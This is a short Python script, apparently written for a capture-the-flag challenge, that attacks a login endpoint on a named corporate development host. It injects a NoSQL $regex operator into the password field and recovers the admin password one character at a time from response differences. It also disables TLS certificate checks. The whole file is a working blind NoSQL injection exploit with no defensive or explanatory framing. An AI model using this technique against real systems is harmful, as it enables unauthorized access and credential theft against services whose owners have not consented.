import requests
import string
import warnings

warnings.filterwarnings("ignore")

url = 'https://nosql.axa-li-jp-dev-int.pink.ap-southeast-1.aws.openpaas.axa-cloud.com/login'
username = 'admin'
password = ''

while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:
            payload = {"username": "{}".format(username), "password": {'$regex': "^{}".format(password + c)}}
            # payload='?username=%s&password[$regex]=^%s' % (username, password + c)
            r = requests.post(url, json=payload, verify=False)
            if 'axactf' in r.text:
                print("Found one more char : {}".format(password+c))
                password += c